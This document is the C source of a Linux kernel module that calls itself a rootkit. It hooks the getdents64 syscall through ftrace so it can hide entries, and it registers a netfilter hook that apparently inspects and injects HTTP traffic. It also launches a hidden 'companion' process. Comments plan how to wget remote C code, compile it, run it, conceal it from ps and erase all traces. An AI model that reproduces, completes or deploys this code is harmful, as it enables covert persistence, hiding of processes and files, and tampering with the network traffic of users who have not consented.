#include "http_injector.h"
#include "hide.h"

int g_pid_companion = -1;

asmlinkage long (*g_original_getdents)(const struct pt_regs *);

static t_ftrace_hook *f_hook[] = {&(t_ftrace_hook){
    .name = "__x64_sys_getdents64",
    .function = (myGetDents),
    .original = (&g_original_getdents),
}, NULL};

static struct nf_hook_ops nfho = {
      .hook        = http_nf_hookfn,
      .hooknum     = NF_INET_LOCAL_OUT,
      .pf          = PF_INET,
      .priority    = NF_IP_PRI_FIRST
};

static int __init rootkit_init(void) {
  printk(KERN_INFO "%i\n", current->pid);
  nfho.hooknum = NF_INET_PRE_ROUTING; 
  nfho.priv = init_search_map();
  fill_search_dict((search_map_t *)nfho.priv);

  nf_register_net_hook(&init_net, &nfho);

  // success = success && my_func(...)
  printk(KERN_INFO "Rootkit has been loaded\n");

  launch_companion();
  get_pid_companion();

  // Protocol:

  // Probably have to run a gcc .c
  // We could host the .c on a github or any server
  // So we would like download the .c, with a wget
  // Then compile it gcc
  // Then launch the companion
  // Then remove all trace

  // So it has to be obfuscate from ps : How do we get the PID ?
  // It's possible to get the pid of a kernelModule with current->pid

  // a mettre dans un fichier pour faire la logic

    printk(KERN_INFO "pid %d\n", g_pid_companion);

    if (fh_install_hook(f_hook[0])) {
      printk(KERN_INFO "Bruh minstall hook eroor\n");
    }

    return 0;
}

static void __exit rootkit_exit(void) {
   search_map_t *map = (search_map_t *)nfho.priv;

   free_search_map(map);
   nf_unregister_net_hook(&init_net, &nfho);

   fh_remove_hook(f_hook[0]);
   printk(KERN_INFO "Rootkit has been unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
